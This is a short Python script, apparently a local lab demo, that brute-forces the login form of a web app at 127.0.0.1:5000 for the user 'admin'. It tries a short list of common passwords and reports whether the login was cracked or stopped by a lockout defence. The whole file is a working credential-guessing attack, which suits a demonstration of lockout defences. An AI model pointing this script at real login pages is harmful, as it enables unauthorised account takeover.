import requests
import time

URL="http://127.0.0.1:5000"
USERNAME="admin"

PASSWORDS=[
    "123456",
    "password",
    "admin",
    "letmein",
    "vasanth" 
]

print("="*40)
print("⚔️  BRUTE FORCE ATTACK STARTED!")
print("="*40)

start=time.time()

for i,pwd in enumerate(PASSWORDS,1):

    r=requests.post(URL,
            data={"username":USERNAME,
                  "password":pwd})

    if"Welcome"in r.text:
        print(f"✅ CRACKED! Password={pwd}")
        print(f"⏱️  Time={round(time.time()-start,2)}seconds")
        print(f"🔢 Attempts={i}")
        print("="*40)
        break

    elif "LOCKED" in r.text:
        print(f"🚫 BLOCKED at attempt {i}!")
        print("🛡️  Defense worked!")
        print("="*40)
        break

    else:
        print(f"❌ Attempt {i}:'{pwd}'→Failed")

    time.sleep(0.5)